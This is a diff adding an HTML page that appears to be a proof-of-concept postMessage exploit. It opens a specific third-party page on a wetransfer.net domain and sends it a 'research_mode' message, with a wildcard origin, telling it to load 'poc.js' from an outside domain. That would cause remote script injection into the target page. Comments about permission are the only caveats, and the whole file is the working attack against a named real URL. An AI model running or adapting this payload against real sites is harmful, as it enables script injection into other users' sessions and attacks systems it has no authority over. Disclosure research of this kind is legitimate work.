@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>postMessage demo with open window</title>
+</head>
+<body>
+  <button id="send">Open Page and Send Message</button>
+
+  <script>
+    const url = "https://backgrounds.wetransfer.net/genie/wepresent/2601/intro-asap-rocky/1_MVUaL7/index.html"; // must be one you control or have permission for
+    let popup;
+
+
+    document.getElementById("send").addEventListener("click", () => {
+      popup = window.open(url);
+      setTimeout(() => {
+        // Only send messages you are authorized to send
+        popup.postMessage(JSON.stringify({
+                command: "research_mode",
+                data: ["https://daemoon.me/poc.js"]
+                }), "*");
+      }, 1000);
+    });
+  </script>
+</body>
+</html>
